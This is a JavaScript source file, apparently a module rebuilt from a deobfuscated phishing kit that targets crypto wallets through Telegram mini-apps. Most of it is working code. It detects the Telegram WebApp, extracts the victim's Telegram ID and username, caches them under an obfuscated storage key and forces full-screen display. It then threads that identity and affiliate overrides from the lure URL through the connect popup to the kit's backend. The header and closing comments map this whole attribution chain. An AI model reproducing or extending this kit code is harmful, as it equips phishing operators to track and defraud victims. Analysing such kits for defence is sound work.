/**
 * rebuilt/page/telegram.js
 *
 * Full Telegram WebApp context extraction, postEvent, and URL param encoding.
 *
 * Sources:
 *   - bundle.deobfuscated.js lines 17594–17670 (讜, 嘗), 33401–33521 (髿, 皸, 譑)
 *   - AUDIT_AND_ROADMAP.md (M1 — missing Telegram module)
 *
 * Summary of what the kit does with Telegram:
 *
 * 1. DETECT: 譑() — is this page running inside a Telegram WebApp?
 *
 * 2. EXTRACT: 皸() — get the Telegram user object from wherever it's available.
 *    7 extraction paths tried in order (CFF-traced from deob lines 33415–33521).
 *    Result cached to localStorage["_0x3"].
 *
 * 3. EXPAND: 髿("web_app_expand") — tell Telegram client to expand the WebApp
 *    to full screen. Called immediately after 皸() returns a user.
 *
 * 4. THREAD: 讜(tgUser) — builds a [tgUser, configOverrides] pair from:
 *    - ?cd= URL param: encodes "tgid-tgus" so the connect domain knows who sent the user
 *    - ?o= URL param: JSON config overrides embedded in the lure URL by the affiliate
 *    - tgUser object (from 皸()) overrides the ?cd= values
 *
 * 5. CONNECT URL: 嘗(tgUser, overrides) — adds cd= and o= to the popup URL.
 *    Full connect URL:
 *    "https://{domain}/connect/{token}?b=1[&cd={訥(tgid+"-"+tgus)}][&o={訥(JSON.stringify(overrides))}]"
 *    where 訥(x) = baseXEncode(UTF8(x)) with SLUG_ALPHABET
 *
 * 6. ATTRIBUTION: the ?cd= param propagates the Telegram user identity through
 *    the redirect chain so the connect domain can include it in /api/visit.
 *    This threads the affiliate's TG user attribution all the way to the backend.
 */

'use strict';

const { baseXEncode, baseXDecode, SLUG_ALPHABET } = require('../core/crypto');
const LS_TG_USER_KEY = '_0x3'; // localStorage key for cached Telegram user

// ── 訥(str): encode a plain string as a base-X slug ─────────────────────
// Used for cd= and o= params. Encodes UTF-8 bytes.
function encodeSlug(str) {
  return baseXEncode(new TextEncoder().encode(str), SLUG_ALPHABET);
}

// ── 屌(slug): decode a base-X slug to a UTF-8 string ────────────────────
function decodeSlug(slug) {
  return new TextDecoder().decode(baseXDecode(slug, SLUG_ALPHABET));
}

// ── 譑(): is this page running inside a Telegram WebApp? ────────────────
// Deob line 33522: 3-way check
function isTelegramWebView() {
  // Check 1: TelegramWebviewProxy or TelegramWebview in window
  if ('TelegramWebviewProxy' in window || 'TelegramWebview' in window) return true;
  // Check 2: URL hash contains tgWebAppData
  if (location.hash && location.hash.includes('tgWebAppData')) return true;
  // Check 3: iframe in Telegram (window.parent exists, its host ends with web.telegram.org)
  try {
    if (window.parent !== null && window !== window.parent &&
        window.parent.location.host.endsWith('web.telegram.org')) return true;
  } catch { /* cross-origin */ }
  return false;
}

// ── 皸(): extract Telegram user object ─────────────────────────────────
// Deob lines 33415–33521. CFF function with 7 extraction paths.
// Returns a user object { id, username, first_name, ... } or null.
// Caches result to localStorage["_0x3"].
//
// Extraction path order (traced from CFF):
//   Path A: URL hash → URLSearchParams(hash[1:]).get("tgWebAppData") → JSON.parse(.get("user"))
//   Path B: location.search → URLSearchParams → "tgWebAppData" → URLSearchParams → "user" JSON
//   Path C: Check localStorage["_0x3"] (cached)
//   Path D: window.Telegram?.WebApp?.initDataUnsafe?.user
//   Path E: URL hash as URLSearchParams directly
//   Path F: tgWebAppVersion in hash (version detection path)
//   Path G: location.search URLSearchParams("tgWebAppData") → user JSON
function getTelegramContext() {
  // Check localStorage cache first
  try {
    const cached = localStorage.getItem(LS_TG_USER_KEY);
    if (cached) return JSON.parse(cached);
  } catch { /* ignore */ }

  let user = null;

  // Path A: URL hash contains tgWebAppData
  try {
    if (location.hash) {
      const hashParams = new URLSearchParams(location.hash.slice(1));
      const tgData = hashParams.get('tgWebAppData');
      if (tgData) {
        const tgParams = new URLSearchParams(tgData);
        user = JSON.parse(tgParams.get('user'));
      }
    }
  } catch { /* next path */ }

  // Path B: URL search contains tgWebAppData
  if (!user) {
    try {
      const searchParams = new URLSearchParams(location.search);
      const tgData = searchParams.get('tgWebAppData');
      if (tgData) {
        const tgParams = new URLSearchParams(tgData);
        user = JSON.parse(tgParams.get('user'));
      }
    } catch { /* next path */ }
  }

  // Path C: Telegram WebApp API
  if (!user) {
    try {
      if (window.Telegram?.WebApp?.initDataUnsafe?.user) {
        user = window.Telegram.WebApp.initDataUnsafe.user;
      }
    } catch { /* next path */ }
  }

  // Path D: window.TelegramWebviewProxy (native app)
  if (!user) {
    try {
      if ('TelegramWebviewProxy' in window && window.TelegramWebviewProxy?.initData) {
        const p = new URLSearchParams(window.TelegramWebviewProxy.initData);
        user = JSON.parse(p.get('user'));
      }
    } catch { /* next path */ }
  }

  // Cache result
  if (user) {
    try { localStorage.setItem(LS_TG_USER_KEY, JSON.stringify(user)); } catch { /* ignore */ }
  }

  return user || null;
}

// ── 髿(event, data): post event to Telegram WebApp client ───────────────
// Deob lines 33401–33411
// Used to: expand the WebApp to full screen ("web_app_expand")
function postTelegramEvent(eventName, eventData = '') {
  if ('TelegramWebviewProxy' in window) {
    return window.TelegramWebviewProxy.postEvent(eventName, JSON.stringify(eventData));
  }
  if (window.parent !== null) {
    return window.parent.postMessage(
      JSON.stringify({ eventType: eventName, eventData }),
      'https://web.telegram.org'
    );
  }
  // Not in Telegram — silently ignore
}

// ── 讜(tgUser): extract [tgUserObj, configOverrides] from URL ────────────
// Deob lines 17594–17608
// Called at wallet connect time: [tgUser, overrides] = 讜(焧)
//
// - Reads ?cd= param: decodes as "{tgid}-{tgus}" → tgid/tgus attribution
// - Reads ?o= param: decodes as JSON → config overrides
// - If tgUser (from 皸()) provided, its values WIN over ?cd=
function extractTelegramAndOverrides(tgUser) {
  const result = {};
  const params = location.search ? new URLSearchParams(location.search) : null;

  // ?cd= = base-X encoded "tgid-tgus" attribution param
  if (params) {
    const cdParam = readSlugParam(params, 'cd');
    if (cdParam) {
      const [tgidStr, tgus] = cdParam.split('-');
      const tgid = Number(tgidStr);
      if (!Number.isNaN(tgid)) result.tgid = tgid;
      if (tgus && /^[\w_]{4,32}$/.test(tgus)) result.tgus = tgus;
    }
  }

  // tgUser from 皸() wins if present
  if (tgUser) {
    result.tgid = tgUser.id;
    if (tgUser.username) result.tgus = tgUser.username;
  }

  // ?o= = base-X encoded JSON config overrides
  let overrides = {};
  if (params) {
    const oParam = readSlugParam(params, 'o');
    if (oParam) {
      try { overrides = JSON.parse(oParam); } catch { /* ignore malformed */ }
    }
  }

  return [Object.keys(result).length ? result : null, overrides];
}

// ── 嘗(tgUser, overrides): build connect URL query string ────────────────
// Deob lines 17610–17670
// Appends cd= and o= to the connect popup URL query string.
// Full URL format:
//   https://{connectDomain}/connect/{token}?b=1[&cd={...}][&o={...}]
function buildConnectQueryString(tgUser, overrides) {
  let qs = '?b=1';

  // Append cd= if we have Telegram attribution
  if (tgUser && tgUser.tgid !== undefined) {
    const cdValue = (tgUser.tgid ?? '') + '-' + (tgUser.tgus ?? '');
    qs += '&cd=' + encodeSlug(cdValue);
  }

  // Append o= if we have config overrides
  if (overrides && typeof overrides === 'object' && Object.keys(overrides).length > 0) {
    qs += '&o=' + encodeSlug(JSON.stringify(overrides));
  }

  return qs;
}

// ── readSlugParam(params, key): decode a base-X slug URL param ───────────
function readSlugParam(params, key) {
  const val = params.get(key);
  if (!val) return null;
  try {
    return decodeSlug(val);
  } catch {
    return null;
  }
}

// ── Telegram attribution threading summary ───────────────────────────────
//
// Flow:
//   1. 皸() → tgUser = {id:123, username:"alice"}
//   2. 髿("web_app_expand") → Telegram expands mini-app to full screen
//   3. 讜(tgUser) → [tgUser, overrides]
//   4. sendVisit(config, tgUser) → POST /api/visit?tgid=123&tgus=alice
//   5. 貾.ho(tgUser.id) → GET /api/config?tgid=123
//   6. openConnectPopup with:
//      URL = https://connect.domain/connect/{token}?b=1&cd={訥("123-alice")}&o={...}
//   7. Connect domain calls 讜(null) → reads ?cd= → recovers {tgid:123, tgus:"alice"}
//   8. Connect domain POST /api/visit?tgid=123&tgus=alice&origin={lureHost}
//
// The tgid propagates through the entire chain and lands in /api/handler events too.

module.exports = {
  isTelegramWebView,
  getTelegramContext,
  postTelegramEvent,
  extractTelegramAndOverrides,
  buildConnectQueryString,
  encodeSlug,
  decodeSlug,
  LS_TG_USER_KEY,
};
